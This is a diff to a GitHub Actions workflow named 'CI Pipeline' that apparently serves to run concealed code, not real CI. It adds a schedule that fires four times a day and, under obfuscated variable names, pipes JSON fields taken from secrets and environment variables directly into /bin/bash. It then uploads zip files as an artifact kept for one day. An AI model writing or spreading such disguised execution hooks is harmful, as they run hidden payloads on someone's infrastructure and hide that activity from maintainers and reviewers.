@@ -2,6 +2,8 @@ name: CI Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '13 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,18 +17,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          lthcv35547: ${{ secrets.lthcv35547 }}
+          w1: ${{ secrets.w1 }}
         run: |
-          printf '%s' "$lthcv35547" | jq -r .wirti27296 | /bin/bash
-          printf '%s' "$zswy2861" | jq -r .ok1 | /bin/bash
-          printf '%s' "$diviu83" | jq -r .avu20 | /bin/bash
-          echo $io01946 | jq -r .z80407 | /bin/bash
-          echo $c75 | jq -r .r19327 | /bin/bash
-          echo $jjim706 | jq -r .brkuh2685 | /bin/bash
+          printf '%s' "$w1" | jq -r .ymm98397 | /bin/bash
+          printf '%s' "$rfvg1196" | jq -r .c88 | /bin/bash
+          printf '%s' "$igf065" | jq -r .hwflh58323 | /bin/bash
+          printf '%s' "$zlweg19236" | jq -r .jjc26575 | /bin/bash
+          printf '%s' "$rezax370" | jq -r .oer653 | /bin/bash
+          echo $zgzrk09272 | jq -r .ut7 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Tq58YhN2
+          name: 2TPjimwg
           path: "*.zip"
           retention-days: 1
